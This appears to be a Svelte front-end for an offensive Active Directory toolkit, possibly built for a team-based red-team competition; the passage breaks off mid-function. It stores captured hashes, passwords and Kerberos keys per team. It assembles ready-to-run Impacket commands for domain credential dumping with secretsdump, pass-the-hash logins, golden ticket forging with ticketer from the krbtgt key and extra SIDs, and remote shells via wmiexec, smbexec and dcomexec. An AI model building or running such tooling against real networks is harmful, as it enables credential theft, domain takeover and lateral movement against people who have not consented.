<script lang="ts">
  import logo from "$lib/assets/logo.png";
  import { onMount } from "svelte";
  import { Button } from "$lib/components/ui/button";
  import { Input } from "$lib/components/ui/input";
  import { Label } from "$lib/components/ui/label";
  import { invalidateAll } from "$app/navigation";
  import {
    Activity,
    CircleDot,
    KeyRound,
    NotebookPen,
    Plus,
    Radar,
    ShieldCheck,
    Trash2,
    Users
  } from "lucide-svelte";

  interface Team {
    name: string;
    subnetId: number | null;
    targets?: string[];
  }

  interface Credential {
    id: number;
    teamName: string;
    os: "windows" | "linux";
    username: string;
    secretType: string;
    secret: string;
    rid: string;
    domain: string;
    host: string;
    ip: string;
    createdAt: string;
  }

  interface CredentialForm {
    os: "windows" | "linux";
    username: string;
    secretType: string;
    secret: string;
    rid: string;
    domain: string;
    host: string;
    ip: string;
  }

  interface Domain {
    id: number;
    teamName: string;
    name: string;
    createdAt: string;
  }

  interface Target {
    id: number;
    teamName: string;
    domainId: number | null;
    domainName: string;
    hostname: string;
    ip: string;
    os: "windows" | "linux";
    createdAt: string;
  }

  interface KerberosCache {
    id: number;
    teamName: string;
    domain: string;
    username: string;
    method: "getTGT" | "ticketer";
    cachePath: string;
    kdcHost: string;
    domainSid: string;
    userId: string;
    groups: string;
    extraSid: string;
    duration: string;
    expiresAt: string;
    notes: string;
    status: "available" | "expired" | "missing_file" | "unknown";
    createdAt: string;
  }

  interface RunKerberosTicketResponse {
    cache: KerberosCache;
    command: string[];
    output: string;
  }

  interface RunSecretsdumpResponse {
    command: string[];
    output: string;
    credentials: Credential[];
  }

  interface LaunchInteractiveCommandResponse {
    command: string[];
    terminal: string;
    title: string;
  }

  interface TargetForm {
    hostname: string;
    ip: string;
    os: "windows" | "linux";
    domainMode: "standalone" | "existing" | "new";
    domainId: string;
    domainName: string;
  }

  interface CommandForm {
    teamName: string;
    commandKind: "secretsdump" | "getTGT" | "ticketer" | "wmiexec" | "smbexec" | "dcomexec";
    impacketStyle: "kali" | "pythonScripts" | "custom";
    customSecretsdump: string;
    customGetTGT: string;
    customTicketer: string;
    customWmiexec: string;
    customSmbexec: string;
    customDcomexec: string;
    dcomObject: "ShellBrowserWindow" | "MMC20" | "ShellWindows";
    targetId: string;
    manualTarget: string;
    authMode: "password" | "hash" | "kerberos";
    ticketAuthMode: "password" | "hash" | "aes";
    justDc: boolean;
    useVss: boolean;
    domain: string;
    username: string;
    password: string;
    lmHash: string;
    ntHash: string;
    aesKey: string;
    krbtgtAesKey: string;
    kdcHost: string;
    useKerberosCache: boolean;
    cachePath: string;
    domainSid: string;
    userId: string;
    groups: string;
    extraSid: string;
    duration: string;
    expiresAt: string;
    notes: string;
  }

  interface EasyModeState {
    teamName: string;
    dcTargetId: string;
    shellTargetId: string;
    credentialId: string;
  }

  type TabId = "main" | "easy" | "command" | "notes" | "credentials";
  type ImpacketTool = "secretsdump" | "getTGT" | "ticketer" | "wmiexec" | "smbexec" | "dcomexec";
  const BACKEND_URL = "http://localhost:8080";
  const IMPACKET_STYLE_KEY = "cfc-tk.impacketCommandStyle";
  const IMPACKET_CUSTOM_TOOLS_KEY = "cfc-tk.impacketCustomTools";
  const credentialScopeFilters = ["users", "all", "domain", "local", "machines"] as const;
  const credentialTypeFilters = ["all", "ntlm", "password", "aes"] as const;

  let { data } = $props();
  let activeTab = $state<TabId>("main");
  let newTeam = $state<Team>({ name: "", subnetId: null });
  let busy = $state(false);
  let popupError = $state("");
  let selectedTeam = $state("");
  let domains = $state<Domain[]>([]);
  let domainsLoading = $state(false);
  let domainError = $state("");
  let domainBusy = $state(false);
  let newDomainName = $state("");
  let targets = $state<Target[]>([]);
  let targetsLoading = $state(false);
  let targetError = $state("");
  let targetBusy = $state(false);
  let targetDeletingId = $state<number | null>(null);
  let lastLoadedTargetTeam = $state("");
  let targetForm = $state<TargetForm>({
    hostname: "",
    ip: "",
    os: "windows",
    domainMode: "standalone",
    domainId: "",
    domainName: ""
  });
  let commandTargets = $state<Target[]>([]);
  let commandTargetsLoading = $state(false);
  let commandCredentials = $state<Credential[]>([]);
  let commandCredentialsLoading = $state(false);
  let kerberosCaches = $state<KerberosCache[]>([]);
  let kerberosCachesLoading = $state(false);
  let kerberosCacheSaved = $state(false);
  let commandRunning = $state(false);
  let commandRunOutput = $state("");
  let commandError = $state("");
  let commandCopied = $state(false);
  let lastLoadedCommandTeam = $state("");
  let easyTargets = $state<Target[]>([]);
  let easyCredentials = $state<Credential[]>([]);
  let easyLoading = $state(false);
  let easyRunning = $state(false);
  let easyError = $state("");
  let easyOutput = $state("");
  let easyCredentialPickerOpen = $state(false);
  let easyCredentialSearch = $state("");
  let easyCredentialScopeFilter = $state<"users" | "all" | "domain" | "local" | "machines">("users");
  let easyCredentialTypeFilter = $state<"all" | "ntlm" | "password" | "aes">("all");
  let lastLoadedEasyTeam = $state("");
  let lastLoadedCredentialTeam = $state("");
  let impacketPreferenceReady = $state(false);
  let commandForm = $state<CommandForm>({
    teamName: "",
    commandKind: "secretsdump",
    impacketStyle: "kali",
    customSecretsdump: "",
    customGetTGT: "",
    customTicketer: "",
    customWmiexec: "",
    customSmbexec: "",
    customDcomexec: "",
    dcomObject: "ShellBrowserWindow",
    targetId: "",
    manualTarget: "",
    authMode: "password",
    ticketAuthMode: "password",
    justDc: false,
    useVss: false,
    domain: "",
    username: "",
    password: "",
    lmHash: "",
    ntHash: "",
    aesKey: "",
    krbtgtAesKey: "",
    kdcHost: "",
    useKerberosCache: true,
    cachePath: "",
    domainSid: "",
    userId: "",
    groups: "",
    extraSid: "",
    duration: "",
    expiresAt: "",
    notes: ""
  });
  let selectedCredentialTeam = $state("");
  let credentials = $state<Credential[]>([]);
  let credentialsLoading = $state(false);
  let credentialsError = $state("");
  let credentialBusy = $state(false);
  let credentialsClearing = $state(false);
  let credentialForm = $state<CredentialForm>({
    os: "windows",
    username: "",
    secretType: "ntlm",
    secret: "",
    rid: "",
    domain: "",
    host: "",
    ip: ""
  });
  let easyMode = $state<EasyModeState>({
    teamName: "",
    dcTargetId: "",
    shellTargetId: "",
    credentialId: ""
  });

  const tabs: { id: TabId; label: string; eyebrow: string }[] = [
    { id: "main", label: "Main", eyebrow: "ops" },
    { id: "easy", label: "Easy", eyebrow: "guided" },
    { id: "command", label: "Command", eyebrow: "run" },
    { id: "notes", label: "Notes", eyebrow: "field" },
    { id: "credentials", label: "Credentials", eyebrow: "vault" }
  ];

  const teams = $derived((data.teams ?? []) as Team[]);
  const targetTotal = $derived(
    targets.length || teams.reduce((total, team) => total + (team.targets?.length ?? 0), 0)
  );
  const groupedTargets = $derived.by(() => {
    const groups = new Map<string, Target[]>();
    for (const target of targets) {
      const key = target.domainName || "Standalone";
      groups.set(key, [...(groups.get(key) ?? []), target]);
    }
    return Array.from(groups.entries()).map(([name, items]) => ({ name, items }));
  });
  const selectedCommandTarget = $derived(
    commandTargets.find((target) => String(target.id) === commandForm.targetId)
  );
  const selectedKerberosTargetName = $derived.by(() => {
    if (!selectedCommandTarget?.hostname) return selectedCommandTarget?.ip || "";
    const hostname = selectedCommandTarget.hostname.trim();
    const domainName = selectedCommandTarget.domainName.trim();
    if (domainName && !hostname.includes(".")) {
      return `${hostname}.${domainName}`;
    }
    return hostname;
  });
  const isInteractiveCommand = $derived(
    commandForm.commandKind === "wmiexec" ||
      commandForm.commandKind === "smbexec" ||
      commandForm.commandKind === "dcomexec"
  );
  const usesTarget = $derived(commandForm.commandKind === "secretsdump" || isInteractiveCommand);
  const selectedCommandTargetLabel = $derived.by(() => {
    if (commandForm.targetId === "manual") return commandForm.manualTarget.trim();
    return selectedCommandTarget?.hostname || selectedCommandTarget?.ip || "";
  });
  const commandTargetAddress = $derived.by(() => {
    if (commandForm.targetId === "manual") return commandForm.manualTarget.trim();
    if (usesTarget && commandForm.authMode === "kerberos") {
      return selectedKerberosTargetName;
    }
    return selectedCommandTarget?.ip || selectedCommandTarget?.hostname || "";
  });
  const selectedEasyDc = $derived(
    easyTargets.find((target) => String(target.id) === easyMode.dcTargetId)
  );
  const selectedEasyShellTarget = $derived(
    easyTargets.find((target) => String(target.id) === easyMode.shellTargetId)
  );
  const easyCredentialOptions = $derived.by(() =>
    easyCredentials.filter(
      (credential) =>
        credential.username.toLowerCase() !== "krbtgt" &&
        (credential.secretType === "password" ||
          credential.secretType === "ntlm" ||
          credential.secretType === "kerberos-ntlm" ||
          credential.secretType.includes("aes"))
    )
  );
  const selectedEasyCredential = $derived(
    easyCredentialOptions.find((credential) => String(credential.id) === easyMode.credentialId)
  );
  const credentialSearchText = (credential: Credential) =>
    [
      credentialIdentity(credential),
      credential.secretType,
      credential.secret,
      credential.rid,
      credential.domain,
      credential.host,
      credential.ip,
      credential.createdAt
    ]
      .join(" ")
      .toLowerCase();
  const filteredEasyCredentialOptions = $derived.by(() => {
    const search = easyCredentialSearch.trim().toLowerCase();

    return easyCredentialOptions.filter((credential) => {
      const isMachine = credential.username.endsWith("$");
      const isDomain = Boolean(credential.domain);
      const typeMatches =
        easyCredentialTypeFilter === "all" ||
        (easyCredentialTypeFilter === "ntlm" && (credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm")) ||
        (easyCredentialTypeFilter === "password" && credential.secretType === "password") ||
        (easyCredentialTypeFilter === "aes" && credential.secretType.includes("aes"));
      const scopeMatches =
        easyCredentialScopeFilter === "all" ||
        (easyCredentialScopeFilter === "users" && !isMachine) ||
        (easyCredentialScopeFilter === "domain" && isDomain) ||
        (easyCredentialScopeFilter === "local" && !isDomain) ||
        (easyCredentialScopeFilter === "machines" && isMachine);

      return typeMatches && scopeMatches && (!search || credentialSearchText(credential).includes(search));
    });
  });
  const targetFqdn = (target: Target | undefined) => {
    if (!target) return "";
    const hostname = target.hostname.trim();
    const domainName = target.domainName.trim();
    if (hostname && domainName && !hostname.includes(".")) {
      return `${hostname}.${domainName}`;
    }
    return hostname || target.ip;
  };
  const easyDcFqdn = $derived(targetFqdn(selectedEasyDc));
  const easyShellTargetFqdn = $derived(targetFqdn(selectedEasyShellTarget));
  const easyShellTargetAddress = $derived(selectedEasyShellTarget?.ip || selectedEasyShellTarget?.hostname || "");
  const easyDomainName = $derived(selectedEasyDc?.domainName || selectedEasyCredential?.domain || "");

  const credentialToAuth = (credential: Credential | undefined) => {
    if (!credential) {
      return {
        authMode: "hash",
        password: "",
        lmHash: "",
        ntHash: "",
        aesKey: ""
      };
    }

    const [lmHash, ntHash] = credential.secret.includes(":")
      ? credential.secret.split(":", 2)
      : ["", credential.secret];

    if (credential.secretType === "password") {
      return {
        authMode: "password",
        password: credential.secret,
        lmHash: "",
        ntHash: "",
        aesKey: ""
      };
    }

    if (credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm") {
      return {
        authMode: "hash",
        password: "",
        lmHash,
        ntHash,
        aesKey: ""
      };
    }

    return {
      authMode: "kerberos",
      password: "",
      lmHash: "",
      ntHash: "",
      aesKey: credential.secret
    };
  };

  const credentialIdentity = (credential: Credential) =>
    `${credential.domain ? `${credential.domain}\\` : ""}${credential.username}`;

  const credentialSecretHint = (credential: Credential) => {
    if (!credential.secret) return "empty";
    if (credential.secretType === "password") return "password";
    if (credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm") {
      const parts = credential.secret.split(":");
      const ntHash = credential.secret.includes(":") ? parts[parts.length - 1] || "" : credential.secret;
      return `NT ...${ntHash.slice(-8)}`;
    }
    if (credential.secretType.includes("aes")) {
      return `key ...${credential.secret.slice(-8)}`;
    }
    return `...${credential.secret.slice(-8)}`;
  };

  const credentialAddedLabel = (credential: Credential) =>
    credential.createdAt ? credential.createdAt.replace("T", " ").replace("Z", " UTC").slice(0, 19) : "unknown";

  const credentialContextLabel = (credential: Credential) =>
    [
      credential.rid ? `RID ${credential.rid}` : "",
      credential.host ? `host ${credential.host}` : "",
      credential.ip ? `ip ${credential.ip}` : ""
    ]
      .filter(Boolean)
      .join(" / ");

  const credentialPickerLabel = (credential: Credential) =>
    [
      credentialIdentity(credential),
      credential.secretType,
      credentialSecretHint(credential),
      credentialContextLabel(credential),
      `added ${credentialAddedLabel(credential)}`
    ]
      .filter(Boolean)
      .join(" / ");

  const readError = async (response: Response, fallback: string) => {
    const body = await response.text().catch(() => "");
    return body.trim() || fallback;
  };

  const isValidIp = (value: string) => {
    const trimmed = value.trim();
    if (!trimmed) return true;

    const octets = trimmed.split(".");
    if (octets.length === 4) {
      return octets.every((octet) => {
        if (!/^\d{1,3}$/.test(octet)) return false;
        const number = Number(octet);
        return number >= 0 && number <= 255 && String(number) === String(Number(octet));
      });
    }

    if (!trimmed.includes(":")) return false;

    try {
      const parsed = new URL(`http://[${trimmed}]/`);
      return parsed.hostname.toLowerCase() === `[${trimmed.toLowerCase()}]`;
    } catch {
      return false;
    }
  };

  const shellQuote = (value: string) => {
    if (!value) return "";
    if (/^[A-Za-z0-9_./:@%+=,-]+$/.test(value)) return value;
    return `'${value.replaceAll("'", "'\\''")}'`;
  };

  const defaultImpacketToolName = (tool: ImpacketTool) => {
    if (commandForm.impacketStyle === "pythonScripts") {
      if (tool === "getTGT") return "getTGT.py";
      return `${tool}.py`;
    }

    if (tool === "getTGT") return "impacket-getTGT";
    return `impacket-${tool}`;
  };

  const impacketToolName = (tool: ImpacketTool) => {
    if (commandForm.impacketStyle !== "custom") return defaultImpacketToolName(tool);
    if (tool === "secretsdump") return commandForm.customSecretsdump.trim() || "impacket-secretsdump";
    if (tool === "getTGT") return commandForm.customGetTGT.trim() || "impacket-getTGT";
    if (tool === "ticketer") return commandForm.customTicketer.trim() || "impacket-ticketer";
    if (tool === "wmiexec") return commandForm.customWmiexec.trim() || "impacket-wmiexec";
    if (tool === "smbexec") return commandForm.customSmbexec.trim() || "impacket-smbexec";
    return commandForm.customDcomexec.trim() || "impacket-dcomexec";
  };

  const safePathPart = (value: string, fallback: string) =>
    (value.trim() || fallback).replace(/[^A-Za-z0-9_.-]+/g, "_");

  const defaultKerberosCachePath = $derived.by(() => {
    const team = safePathPart(commandForm.teamName, "team");
    const domain = safePathPart(commandForm.domain, "domain");
    const user = safePathPart(commandForm.username, "user");
    return `server/${team}/${domain}/${user}.ccache`;
  });

  const selectedKerberosCache = $derived.by(() =>
    kerberosCaches.find(
      (cache) =>
        cache.domain.toLowerCase() === commandForm.domain.trim().toLowerCase() &&
        cache.username.toLowerCase() === commandForm.username.trim().toLowerCase() &&
        cache.status === "available"
    )
  );
  const credentialMatchesCommandAuth = (credential: Credential) => {
    if (commandForm.commandKind === "ticketer") {
      return credential.username.toLowerCase() === "krbtgt" && credential.secretType.includes("aes");
    }
    if (commandForm.commandKind === "getTGT") {
      if (commandForm.ticketAuthMode === "password") return credential.secretType === "password";
      if (commandForm.ticketAuthMode === "hash") return credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm";
      return credential.secretType.includes("aes");
    }
    if (commandForm.authMode === "password") return credential.secretType === "password";
    if (commandForm.authMode === "hash") return credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm";
    return credential.secretType.includes("aes");
  };
  const commandCredentialOptions = $derived.by(() => {
    const selectedDomain = commandForm.domain.trim().toLowerCase();
    return commandCredentials
      .filter(credentialMatchesCommandAuth)
      .filter((credential) => !selectedDomain || credential.domain.toLowerCase() === selectedDomain)
      .slice(0, 50);
  });

  const kerberosCachePath = $derived(commandForm.cachePath.trim() || defaultKerberosCachePath);

  const kerberosEnvPreview = $derived.by(() => {
    const path = kerberosCachePath;
    return [
      `PowerShell: $env:KRB5CCNAME=${JSON.stringify(path)}`,
      `sh: export KRB5CCNAME=${shellQuote(path)}`
    ].join("\n");
  });

  const commandTitle = $derived.by(() => {
    return impacketToolName(commandForm.commandKind);
  });

  const commandPreview = $derived.by(() => {
    const target = commandTargetAddress;
    const user = commandForm.username.trim();
    const domain = commandForm.domain.trim();

    if (!user) return "Enter a username.";

    const userPrefix = domain ? `${domain}/${user}` : user;
    if (commandForm.commandKind === "getTGT") {
      if (!domain) return "Enter a domain.";

      const args = [impacketToolName("getTGT")];
      if (commandForm.kdcHost.trim()) {
        args.push("-dc-ip", shellQuote(commandForm.kdcHost.trim()));
      }
      if (commandForm.ticketAuthMode === "password") {
        const password = commandForm.password ? commandForm.password : "<password>";
        args.push(shellQuote(`${userPrefix}:${password}`));
      } else if (commandForm.ticketAuthMode === "hash") {
        const lmHash = commandForm.lmHash.trim() || "";
        const ntHash = commandForm.ntHash.trim() || "<ntlm_hash>";
        args.push("-hashes", shellQuote(`${lmHash}:${ntHash}`), shellQuote(userPrefix));
      } else {
        const aesKey = commandForm.aesKey.trim() || "<user_aes_key>";
        args.push("-aesKey", shellQuote(aesKey), shellQuote(userPrefix));
      }

      return `${args.join(" ")}\n\n${kerberosEnvPreview}`;
    }

    if (commandForm.commandKind === "ticketer") {
      if (!domain) return "Enter a domain FQDN.";
      if (!commandForm.domainSid.trim()) return "Enter the domain SID.";

      const args = [impacketToolName("ticketer")];
      args.push("-aesKey", shellQuote(commandForm.krbtgtAesKey.trim() || "<krbtgt_aes_key>"));
      args.push("-domain-sid", shellQuote(commandForm.domainSid.trim()));
      args.push("-domain", shellQuote(domain));
      if (commandForm.userId.trim()) {
        args.push("-user-id", shellQuote(commandForm.userId.trim()));
      }
      if (commandForm.groups.trim()) {
        args.push("-groups", shellQuote(commandForm.groups.trim()));
      }
      if (commandForm.extraSid.trim()) {
        args.push("-extra-sid", shellQuote(commandForm.extraSid.trim()));
      }
      if (commandForm.duration.trim()) {
        args.push("-duration", shellQuote(commandForm.duration.trim()));
      }
      args.push(shellQuote(user));

      return `${args.join(" ")}\n\n${kerberosEnvPreview}`;
    }

    if (!target) return "Select a target or enter a manual target.";

    const args = [impacketToolName(commandForm.commandKind)];

    if (commandForm.commandKind === "dcomexec") {
      args.push("-object", commandForm.dcomObject);
    }

    if (commandForm.commandKind === "secretsdump" && commandForm.justDc) {
      args.push("-just-dc");
    }

    if (commandForm.commandKind === "secretsdump" && commandForm.useVss) {
      args.push("-use-vss");
    }

    if (commandForm.kdcHost.trim()) {
      args.push("-dc-ip", shellQuote(commandForm.kdcHost.trim()));
    }

    if (commandForm.authMode === "password") {
      const password = commandForm.password ? commandForm.password : "<password>";
      args.push(shellQuote(`${userPrefix}:${password}@${target}`));
    } else if (commandForm.authMode === "hash") {
      const lmHash = commandForm.lmHash.trim() || "";
      const ntHash = commandForm.ntHash.trim() || "<ntlm_hash>";
      args.push("-hashes", shellQuote(`${lmHash}:${ntHash}`), shellQuote(`${userPrefix}@${target}`));
    } else {
      args.push("-k");
      if (commandForm.useKerberosCache || !commandForm.aesKey.trim()) {
        args.push("-no-pass");
      }
      if (commandForm.aesKey.trim()) {
        args.push("-aesKey", shellQuote(commandForm.aesKey.trim()));
      }
      args.push(shellQuote(`${userPrefix}@${target}`));
    }

    if (commandForm.authMode === "kerberos" && commandForm.useKerberosCache) {
      return `${kerberosEnvPreview}\n${args.join(" ")}`;
    }

    return args.join(" ");
  });

  const loadCredentials = async (teamName: string) => {
    credentialsLoading = true;
    credentialsError = "";

    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/credentials`
      );

      if (!response.ok) {
        credentialsError = await readError(response, "Could not load credentials.");
        credentials = [];
        return;
      }

      credentials = (await response.json()) as Credential[];
    } catch (error) {
      credentialsError = error instanceof Error ? error.message : "Could not load credentials.";
      credentials = [];
    } finally {
      credentialsLoading = false;
    }
  };

  const loadCommandCredentials = async (teamName: string) => {
    commandCredentialsLoading = true;

    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/credentials`
      );

      if (!response.ok) {
        commandCredentials = [];
        return;
      }

      commandCredentials = (await response.json()) as Credential[];
    } catch {
      commandCredentials = [];
    } finally {
      commandCredentialsLoading = false;
    }
  };

  const loadEasyModeData = async (teamName: string) => {
    easyLoading = true;
    easyError = "";

    try {
      const [targetsResponse, credentialsResponse] = await Promise.all([
        fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/targets`),
        fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/credentials`)
      ]);

      if (!targetsResponse.ok) {
        easyError = await readError(targetsResponse, "Could not load Easy Mode targets.");
        easyTargets = [];
        easyCredentials = [];
        return;
      }
      if (!credentialsResponse.ok) {
        easyError = await readError(credentialsResponse, "Could not load Easy Mode credentials.");
        easyTargets = [];
        easyCredentials = [];
        return;
      }

      easyTargets = (await targetsResponse.json()) as Target[];
      easyCredentials = (await credentialsResponse.json()) as Credential[];
    } catch (error) {
      easyError = error instanceof Error ? error.message : "Could not load Easy Mode data.";
      easyTargets = [];
      easyCredentials = [];
    } finally {
      easyLoading = false;
    }
  };

  const loadDomains = async (teamName: string) => {
    domainsLoading = true;
    domainError = "";

    try {
      const response = await fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/domains`);
      if (!response.ok) {
        domainError = await readError(response, "Could not load domains.");
        domains = [];
        return;
      }
      domains = (await response.json()) as Domain[];
    } catch (error) {
      domainError = error instanceof Error ? error.message : "Could not load domains.";
      domains = [];
    } finally {
      domainsLoading = false;
    }
  };

  const loadTargets = async (teamName: string) => {
    targetsLoading = true;
    targetError = "";

    try {
      const response = await fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/targets`);
      if (!response.ok) {
        targetError = await readError(response, "Could not load targets.");
        targets = [];
        return;
      }
      targets = (await response.json()) as Target[];
    } catch (error) {
      targetError = error instanceof Error ? error.message : "Could not load targets.";
      targets = [];
    } finally {
      targetsLoading = false;
    }
  };

  const loadCommandTargets = async (teamName: string) => {
    commandTargetsLoading = true;
    commandError = "";

    try {
      const response = await fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/targets`);
      if (!response.ok) {
        commandError = await readError(response, "Could not load command targets.");
        commandTargets = [];
        return;
      }
      commandTargets = (await response.json()) as Target[];
    } catch (error) {
      commandError = error instanceof Error ? error.message : "Could not load command targets.";
      commandTargets = [];
    } finally {
      commandTargetsLoading = false;
    }
  };

  const loadKerberosCaches = async (teamName: string) => {
    kerberosCachesLoading = true;
    commandError = "";

    try {
      const response = await fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/kerberos-caches`);
      if (!response.ok) {
        commandError = await readError(response, "Could not load Kerberos caches.");
        kerberosCaches = [];
        return;
      }
      kerberosCaches = (await response.json()) as KerberosCache[];
    } catch (error) {
      commandError = error instanceof Error ? error.message : "Could not load Kerberos caches.";
      kerberosCaches = [];
    } finally {
      kerberosCachesLoading = false;
    }
  };

  $effect(() => {
    if (teams.length === 0) {
      selectedTeam = "";
      domains = [];
      targets = [];
      commandForm = { ...commandForm, teamName: "", targetId: "" };
      commandTargets = [];
      kerberosCaches = [];
      easyMode = { teamName: "", dcTargetId: "", shellTargetId: "", credentialId: "" };
      easyTargets = [];
      easyCredentials = [];
      selectedCredentialTeam = "";
      credentials = [];
      return;
    }

    if (!selectedTeam || !teams.some((team) => team.name === selectedTeam)) {
      selectedTeam = teams[0].name;
    }

    if (!commandForm.teamName || !teams.some((team) => team.name === commandForm.teamName)) {
      commandForm = { ...commandForm, teamName: teams[0].name, targetId: "" };
    }

    if (!easyMode.teamName || !teams.some((team) => team.name === easyMode.teamName)) {
      easyMode = { ...easyMode, teamName: teams[0].name, dcTargetId: "", shellTargetId: "", credentialId: "" };
    }

    if (!selectedCredentialTeam || !teams.some((team) => team.name === selectedCredentialTeam)) {
      selectedCredentialTeam = teams[0].name;
    }
  });

  $effect(() => {
    if (!selectedTeam) return;
    if (selectedTeam === lastLoadedTargetTeam) return;
    lastLoadedTargetTeam = selectedTeam;
    targetForm = {
      hostname: "",
      ip: "",
      os: "windows",
      domainMode: "standalone",
      domainId: "",
      domainName: ""
    };
    void loadDomains(selectedTeam);
    void loadTargets(selectedTeam);
  });

  $effect(() => {
    if (!commandForm.teamName) return;
    if (commandForm.teamName === lastLoadedCommandTeam) return;
    lastLoadedCommandTeam = commandForm.teamName;
    void loadCommandTargets(commandForm.teamName);
    void loadKerberosCaches(commandForm.teamName);
    void loadCommandCredentials(commandForm.teamName);
    commandForm = { ...commandForm, targetId: "", manualTarget: "" };
  });

  $effect(() => {
    if (!easyMode.teamName) return;
    if (easyMode.teamName === lastLoadedEasyTeam) return;
    lastLoadedEasyTeam = easyMode.teamName;
    easyMode = { ...easyMode, dcTargetId: "", shellTargetId: "", credentialId: "" };
    void loadEasyModeData(easyMode.teamName);
  });

  $effect(() => {
    if (!selectedCredentialTeam) return;
    if (selectedCredentialTeam === lastLoadedCredentialTeam) return;
    lastLoadedCredentialTeam = selectedCredentialTeam;
    void loadCredentials(selectedCredentialTeam);
  });

  $effect(() => {
    if (!impacketPreferenceReady) return;
    localStorage.setItem(IMPACKET_STYLE_KEY, commandForm.impacketStyle);
  });

  $effect(() => {
    if (!impacketPreferenceReady) return;
    localStorage.setItem(
      IMPACKET_CUSTOM_TOOLS_KEY,
      JSON.stringify({
        secretsdump: commandForm.customSecretsdump,
        getTGT: commandForm.customGetTGT,
        ticketer: commandForm.customTicketer,
        wmiexec: commandForm.customWmiexec,
        smbexec: commandForm.customSmbexec,
        dcomexec: commandForm.customDcomexec
      })
    );
  });

  onMount(() => {
    const savedStyle = localStorage.getItem(IMPACKET_STYLE_KEY);
    if (savedStyle === "kali" || savedStyle === "pythonScripts" || savedStyle === "custom") {
      commandForm = { ...commandForm, impacketStyle: savedStyle };
    }

    const savedCustomTools = localStorage.getItem(IMPACKET_CUSTOM_TOOLS_KEY);
    if (savedCustomTools) {
      try {
        const customTools = JSON.parse(savedCustomTools) as Partial<Record<ImpacketTool, string>>;
        commandForm = {
          ...commandForm,
          customSecretsdump: customTools.secretsdump ?? commandForm.customSecretsdump,
          customGetTGT: customTools.getTGT ?? commandForm.customGetTGT,
          customTicketer: customTools.ticketer ?? commandForm.customTicketer,
          customWmiexec: customTools.wmiexec ?? commandForm.customWmiexec,
          customSmbexec: customTools.smbexec ?? commandForm.customSmbexec,
          customDcomexec: customTools.dcomexec ?? commandForm.customDcomexec
        };
      } catch {
        localStorage.removeItem(IMPACKET_CUSTOM_TOOLS_KEY);
      }
    }

    impacketPreferenceReady = true;
  });

  const handleAddTeam = async (event: SubmitEvent) => {
    event.preventDefault();
    popupError = "";
    busy = true;

    const form = event.currentTarget as HTMLFormElement;
    const formData = new FormData(form);
    const name = String(formData.get("name") ?? "").trim();
    const subnetRaw = String(formData.get("subnetId") ?? "").trim();
    const subnetId = Number(subnetRaw);

    if (!name) {
      popupError = "Team name is required.";
      busy = false;
      return;
    }

    if (!Number.isInteger(subnetId) || subnetId <= 0) {
      popupError = "Subnet number must be a positive integer.";
      busy = false;
      return;
    }

    try {
      const response = await fetch(`${BACKEND_URL}/api/teams`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, subnetId })
      });

      if (!response.ok) {
        popupError = await readError(response, "Could not add team.");
        return;
      }

      newTeam = { name: "", subnetId: null };
      form.reset();
      await invalidateAll();
    } catch (error) {
      popupError = error instanceof Error ? error.message : "Could not add team.";
    } finally {
      busy = false;
    }
  };

  const handleAddCredential = async (event: SubmitEvent) => {
    event.preventDefault();
    credentialsError = "";
    credentialBusy = true;

    if (!selectedCredentialTeam) {
      credentialsError = "Select a team first.";
      credentialBusy = false;
      return;
    }

    if (!isValidIp(credentialForm.ip)) {
      credentialsError = "IP must be a valid IPv4 or IPv6 address.";
      credentialBusy = false;
      return;
    }

    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(selectedCredentialTeam)}/credentials`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(credentialForm)
        }
      );

      if (!response.ok) {
        credentialsError = await readError(response, "Could not add credential.");
        return;
      }

      credentialForm = {
        os: "windows",
        username: "",
        secretType: "ntlm",
        secret: "",
        rid: "",
        domain: "",
        host: "",
        ip: ""
      };
      await loadCredentials(selectedCredentialTeam);
    } catch (error) {
      credentialsError = error instanceof Error ? error.message : "Could not add credential.";
    } finally {
      credentialBusy = false;
    }
  };

  const handleClearCredentials = async () => {
    credentialsError = "";

    if (!selectedCredentialTeam) {
      credentialsError = "Select a team first.";
      return;
    }

    const confirmed = confirm(`Clear all credentials for ${selectedCredentialTeam}?`);
    if (!confirmed) return;

    credentialsClearing = true;
    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(selectedCredentialTeam)}/credentials`,
        { method: "DELETE" }
      );

      if (!response.ok) {
        credentialsError = await readError(response, "Could not clear credentials.");
        return;
      }

      credentials = [];
      if (commandForm.teamName === selectedCredentialTeam) {
        commandCredentials = [];
      }
    } catch (error) {
      credentialsError = error instanceof Error ? error.message : "Could not clear credentials.";
    } finally {
      credentialsClearing = false;
    }
  };

  const handleAddDomain = async (event: SubmitEvent) => {
    event.preventDefault();
    domainError = "";
    domainBusy = true;

    const name = newDomainName.trim();
    if (!selectedTeam) {
      domainError = "Select a team first.";
      domainBusy = false;
      return;
    }
    if (!name) {
      domainError = "Domain name is required.";
      domainBusy = false;
      return;
    }

    try {
      const response = await fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(selectedTeam)}/domains`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name })
      });
      if (!response.ok) {
        domainError = await readError(response, "Could not add domain.");
        return;
      }

      newDomainName = "";
      await loadDomains(selectedTeam);
    } catch (error) {
      domainError = error instanceof Error ? error.message : "Could not add domain.";
    } finally {
      domainBusy = false;
    }
  };

  const handleAddTarget = async (event: SubmitEvent) => {
    event.preventDefault();
    targetError = "";
    targetBusy = true;

    const hostname = targetForm.hostname.trim();
    const ip = targetForm.ip.trim();
